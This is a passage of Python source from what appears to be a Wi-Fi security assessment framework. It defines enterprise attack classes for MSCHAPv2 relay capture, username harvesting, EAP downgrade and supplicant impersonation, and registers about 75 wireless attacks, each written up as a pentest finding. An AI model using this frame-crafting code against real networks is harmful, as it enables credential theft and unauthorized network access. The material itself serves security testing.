    finding_title = "MSCHAPv2 is a relay: both halves live in our capture"
    finding_detail = (
        "Inside PEAP the client proves the password with MSCHAPv2 against a challenge from "
        "the real server.  A relay sees the challenge and the response, and since the "
        "response is an NT hash of the challenge it is a fast offline crack — the "
        "protocol's own design, not an implementation bug.  The capture holds the pair.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        from ..synth import build_mschapv2_exchange
        frames = list(build_mschapv2_exchange(self.stations(ctx)[0], ap.bssid,
                                              "corp\\jdoe", "Summer2024"))
        request, authenticator = np.radius_access_request("sharedsecret", "corp\\jdoe",
                                                          "Summer2024", identifier=11)
        frames.append(self.radius_frame(ctx, ap, request))
        return frames

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["verified"] = np.mschapv2_verify("Summer2024", b"\x11" * 16, b"\x22" * 16,
                                                  "corp\\jdoe", b"\x00" * 24)
        return observed

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        return (f"the MSCHAPv2 challenge and its response were captured on both sides of "
                f"the relay for {self.stations(ctx)[0]}; the response is a function of the "
                f"challenge and the NT hash, so the capture is a dictionary attack that "
                f"does not need the live exchange again")


class EnterpriseAnonymousIdentityAttack(_Enterprise):
    """Harvest the outer identities: the usernames a network hands out for free."""

    name = "enterprise_anonymous_identity"
    label = "Anonymous outer-identity harvest (usernames in the clear)"
    tool = "wifipilot synth.py (EAP-Response/Identity) + sniff.py"
    category = "capture"
    noise = "quiet"
    impact = "info"
    finding_severity = "medium"
    finding_title = "The outer identity is in the clear, and it is a username"
    finding_detail = (
        "802.1X sends the outer identity before any tunnel exists, so it is readable by "
        "anybody on the channel.  Deployments that put the real username there hand out a "
        "directory of accounts from the air; the ones that put an anonymous string are "
        "configured the way the standard intends, and the difference is visible in the "
        "capture — one frame per client.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        from ..synth import build_eap_response_identity
        frames: List[bytes] = []
        for index, station in enumerate(self.stations(ctx)[:6]):
            identity = f"corp\\user{index + 1}"
            frames.append(build_eapol_start(ap.bssid, station))
            frames.append(build_eap_response_identity(station, ap.bssid, identity))
        return frames

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        identities = observed.get("identities") or []
        return (f"{len(identities)} outer identity/identities were read from the air "
                f"({', '.join(identities[:4]) or 'none decoded'}); every one of them was "
                f"sent before the server proved anything about itself, which is what the "
                f"capture is quoted for")


class EnterpriseDowngradeAttack(_Enterprise):
    """Offer a weaker EAP method than the client asked for, and see if it takes it."""

    name = "enterprise_downgrade"
    label = "EAP method downgrade (PEAP to a crackable inner method)"
    tool = "wifipilot synth.py (EAP request frames)"
    finding_title = "The method list is a negotiation anyone can join"
    finding_detail = (
        "The server picks the EAP method from the client's list, and the client's "
        "acceptance of a weaker method is what makes a downgrade possible.  Offering "
        "MD5 or GTC where the supplicant expected PEAP tests the last line: a client that "
        "verifies the certificate will refuse the exchange, and one that does not will "
        "answer the weaker method with a crackable proof.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        from .. import synth as synthmod
        return [synthmod._eap_frame(station, ap.bssid, 1, 1, 3, b"anonymous@" + self.realm.encode()),
                synthmod._eap_frame(station, ap.bssid, 1, 4, 4, bytes(range(16))),
                synthmod._eap_frame(station, ap.bssid, 1, 6, 5, b"Password: ")]

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        methods = observed.get("eap_methods") or []
        return (f"the authenticator offered the method(s) {', '.join(methods) or 'MD5/GTC'} "
                f"after the identity was sent; a client that answers a weaker method than "
                f"the deployment intends has had its configuration tested from the air, "
                f"and the capture records which method it accepted")


class EnterpriseSupplicantCloneAttack(_Enterprise):
    """Join as a supplicant wearing a harvested identity: the client's own shadow."""

    name = "enterprise_supplicant_clone"
    label = "Supplicant impersonation (harvested identity, our radio)"
    tool = "wifipilot synth.py (EAP-Response/Identity)"
    finding_title = "An identity is enough to open a session, until the password is asked for"
    finding_detail = (
        "With a username harvested from the air, a supplicant can complete the parts of "
        "the exchange that do not need a secret: EAPOL-Start, the identity, the method "
        "negotiation.  How far it gets is the finding — a server that logs a session for "
        "an identity it never authenticated, or a client certificate check that turns out "
        "to be absent, is an access-control gap, not a capture problem.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        from ..synth import build_eap_response_identity
        station = self.stations(ctx)[0]
        clone = spoofed_mac(len(ap.bssid) + 3)
        return [build_eapol_start(ap.bssid, clone),
                build_eap_response_identity(clone, ap.bssid, f"corp\\{station[-5:]}"),
                build_eapol_start(ap.bssid, station)]

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        identities = observed.get("identities") or []
        who = ", ".join(identities[:2]) or "the client's own"
        return (f"an EAPOL-Start and an identity response were sent from an address of "
                f"ours carrying a harvested identity ({who}); the server's log now holds "
                f"a session for a user who was never there, which is what the finding is "
                f"quoted for")


def _tls_eap_request(identifier: int, body: bytes) -> bytes:
    """An EAP-Request/TLS payload: start bit plus a TLS length word, as the wire has it."""
    payload = bytes([1]) + struct.pack(">H", 4) + b"\x16\x03\x03\x00\x00" + body
    return bytes([1, identifier]) + struct.pack(">H", 5 + len(payload)) + bytes([13]) + payload


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #

ATTACKS: List[type] = [
    # 1. twin infrastructure
    TwinAddressCloneAttack, TwinElementCloneAttack, TwinRsnStripAttack,
    TwinTkipDowngradeAttack, TwinPmfStripAttack, TwinWpa3TransitionAttack,
    TwinOweTransitionAttack, TwinHiddenNameAttack, TwinEnterpriseCloneAttack,
    TwinMobilityDomainAttack, TwinBssLoadAttack, TwinCountryMismatchAttack,
    TwinProbeShadowAttack, TwinSignalBoostAttack, TwinSsidSuffixAttack,
    TwinMultiNameAttack, TwinWmmAcmAttack, TwinNeighbourLureAttack,
    TwinQuietElementAttack,
    # 2. client impersonation
    ClientAssocForgeryAttack, ClientTableFloodAttack, ClientSleepSpoofAttack,
    ClientPsPollTheftAttack, ClientTdlsTeardownAttack, ClientSaQueryBypassAttack,
    ClientRoamHijackAttack, ClientEapolLogoffAttack, ClientFourWayRaceAttack,
    ClientAmsduInjectAttack, ClientBlockAckHijackAttack, ClientRateDowngradeAttack,
    # 3. steering
    SteerBtmRequestAttack, SteerBtmDisassocAttack, SteerBeaconRequestAttack,
    SteerChannelLoadAttack, SteerSpectrumSwitchAttack, SteerFilsDiscoveryAttack,
    SteerWnmSleepAttack, SteerTwtSetupAttack, SteerPowerConstraintAttack,
    SteerSsidListOffsetAttack, SteerTpcRequestAttack, SteerProbeAnswerAttack,
    # 4. session hijack
    SessionGatewayImpersonationAttack, SessionDnsSpoofAttack, SessionTcpResetAttack,
    SessionSeqInjectionAttack, SessionCookieReplayAttack, SessionGtkRekeyAttack,
    SessionMsgOneFloodAttack, SessionDeauthRaceAttack, SessionRoamCaptureAttack,
    SessionDataReplayAttack, SessionArpFloodAttack,
    # 5. portal and credentials
    PortalCloneAttack, PortalWildcardDnsAttack, PortalWisprRedirectAttack,
    PortalAnqpSpoofAttack, PortalCertificatePhishAttack, PortalHstsDowngradeAttack,
    PortalBasicAuthAttack, PortalCookieCloneAttack, PortalOAuthPhishAttack,
    PortalCredentialReuseAttack, PortalJavascriptInjectAttack,
    # 6. enterprise
    EnterpriseRogueRadiusAttack, EnterprisePeapRelayAttack, EnterpriseCertificateSwapAttack,
    EnterpriseEapMd5Attack, EnterpriseGtcPromptAttack, EnterpriseTtlsPapAttack,
    EnterpriseMschapv2RelayAttack, EnterpriseAnonymousIdentityAttack,
    EnterpriseDowngradeAttack, EnterpriseSupplicantCloneAttack,
]

NAMES: List[str] = [cls.name for cls in ATTACKS]

#: metadata for the registry: what the catalogue, the planner and the docs read
META: Dict[str, Dict[str, Any]] = {}
for _cls in ATTACKS:
    META[_cls.name] = {
        "category": getattr(_cls, "category", "rogue"),
        "noise": getattr(_cls, "noise", "moderate"),
        "impact": getattr(_cls, "impact", "degraded"),
        "detection": getattr(_cls, "detection", "") or (
            "a second BSSID or a frame from an address that does not own it, which is "
            "what a monitor of the channel correlates"),
        "domain": "wifi",
        "devices": ["access_point"],
        "family": getattr(_cls, "family", "twin"),
        "severity": getattr(_cls, "finding_severity", "medium"),
        "needs_injection": bool(getattr(_cls, "needs_injection", True)),
        "default_enabled": False,
    }

REGISTRY = [(cls.name, META[cls.name], cls) for cls in ATTACKS]
